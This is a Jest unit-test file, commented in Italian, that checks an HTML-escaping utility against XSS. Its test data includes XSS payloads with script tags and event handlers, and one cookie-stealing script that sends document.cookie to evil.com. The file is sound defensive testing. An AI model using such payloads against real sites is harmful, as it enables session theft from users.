/**
 * Unit Tests per core/escapeHtml.js
 *
 * Utility centralizzata server-side per la sanitizzazione HTML.
 * Previene attacchi XSS escapando i caratteri speciali HTML.
 */

const escapeHtml = require('../../../core/escapeHtml');

describe('core/escapeHtml', () => {

  // ─── Sostituzione singoli caratteri ────────────────────────────────────────

  describe('sostituzione singoli caratteri', () => {
    test('& → &amp;', () => {
      expect(escapeHtml('A & B')).toBe('A &amp; B');
    });

    test('< → &lt;', () => {
      expect(escapeHtml('a < b')).toBe('a &lt; b');
    });

    test('> → &gt;', () => {
      expect(escapeHtml('a > b')).toBe('a &gt; b');
    });

    test('" → &quot;', () => {
      expect(escapeHtml('a "b" c')).toBe('a &quot;b&quot; c');
    });

    test("' → &#39;", () => {
      expect(escapeHtml("a 'b' c")).toBe('a &#39;b&#39; c');
    });
  });

  // ─── Combinazione caratteri ────────────────────────────────────────────────

  describe('combinazione di più caratteri speciali', () => {
    test('tutti i caratteri speciali insieme', () => {
      expect(escapeHtml('<script>alert("xss")</script>'))
        .toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    });

    test('attributo con apici e virgolette', () => {
      expect(escapeHtml('onclick="alert(\'xss\')"'))
        .toBe('onclick=&quot;alert(&#39;xss&#39;)&quot;');
    });

    test('tag con attributi', () => {
      expect(escapeHtml('<img src="x" onerror="alert(1)">'))
        .toBe('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;');
    });
  });

  // ─── Input non-stringa ─────────────────────────────────────────────────────

  describe('input non-stringa', () => {
    test('null → stringa vuota', () => {
      expect(escapeHtml(null)).toBe('');
    });

    test('undefined → stringa vuota', () => {
      expect(escapeHtml(undefined)).toBe('');
    });

    test('numero → stringa vuota', () => {
      expect(escapeHtml(42)).toBe('');
    });

    test('boolean → stringa vuota', () => {
      expect(escapeHtml(true)).toBe('');
    });

    test('oggetto → stringa vuota', () => {
      expect(escapeHtml({})).toBe('');
    });

    test('array → stringa vuota', () => {
      expect(escapeHtml([])).toBe('');
    });
  });

  // ─── Stringhe sicure (nessuna modifica) ────────────────────────────────────

  describe('stringhe senza caratteri speciali', () => {
    test('stringa vuota resta vuota', () => {
      expect(escapeHtml('')).toBe('');
    });

    test('testo semplice non viene modificato', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World');
    });

    test('stringa con numeri non viene modificata', () => {
      expect(escapeHtml('user123')).toBe('user123');
    });

    test('stringa con email sicura non viene modificata', () => {
      expect(escapeHtml('user@example.com')).toBe('user@example.com');
    });
  });

  // ─── Scenari XSS realistici ────────────────────────────────────────────────

  describe('scenari XSS realistici', () => {
    test('script injection in username', () => {
      const maliciousUsername = '<script>document.location="http://evil.com?c="+document.cookie</script>';
      const result = escapeHtml(maliciousUsername);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
      expect(result).toContain('&lt;script&gt;');
    });

    test('event handler injection in email', () => {
      const maliciousEmail = '" onmouseover="alert(1)" data-x="';
      const result = escapeHtml(maliciousEmail);
      expect(result).not.toContain('"');
      expect(result).toContain('&quot;');
    });

    test('img tag injection in role name', () => {
      const maliciousRoleName = '<img src=x onerror=alert(1)>';
      const result = escapeHtml(maliciousRoleName);
      expect(result).not.toContain('<img');
      expect(result).toContain('&lt;img');
    });

    test('SVG onload injection in description', () => {
      const maliciousDesc = '<svg onload="alert(document.cookie)">';
      const result = escapeHtml(maliciousDesc);
      expect(result).not.toContain('<svg');
      expect(result).toContain('&lt;svg');
    });

    test('href javascript protocol injection', () => {
      const maliciousHref = 'javascript:alert(1)';
      // escapeHtml non blocca javascript: protocol (non contiene caratteri speciali HTML)
      // Questo è un caso diverso che richiede validazione URL, non solo escaping
      expect(escapeHtml(maliciousHref)).toBe('javascript:alert(1)');
    });

    test('nested encoding attack', () => {
      const nestedAttack = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = escapeHtml(nestedAttack);
      // Il primo & viene escapato → &amp;lt;script&amp;gt;
      expect(result).toContain('&amp;lt;');
      expect(result).not.toContain('<script>');
    });
  });

  // ─── Consistenza con bootstrapNavbar/escapeHtml ────────────────────────────

  describe('consistenza con implementazione bootstrapNavbar', () => {
    let navbarEscapeHtml;

    beforeAll(() => {
      try {
        const navbarRenderer = require('../../../plugins/bootstrapNavbar/lib/navbarRenderer');
        navbarEscapeHtml = navbarRenderer.escapeHtml;
      } catch {
        // Plugin potrebbe non essere disponibile
        navbarEscapeHtml = null;
      }
    });

    test('stessi risultati per stringhe con caratteri speciali', () => {
      if (!navbarEscapeHtml) return; // Skip se plugin non disponibile

      const testCases = [
        '<script>alert("xss")</script>',
        'A & B "C" \'D\'',
        '<img src=x onerror=alert(1)>',
        'Hello World',
        '',
      ];

      testCases.forEach(input => {
        expect(escapeHtml(input)).toBe(navbarEscapeHtml(input));
      });
    });

    test('stesso comportamento per input non-stringa', () => {
      if (!navbarEscapeHtml) return;

      [null, undefined, 42, true, {}, []].forEach(input => {
        expect(escapeHtml(input)).toBe(navbarEscapeHtml(input));
      });
    });
  });
});
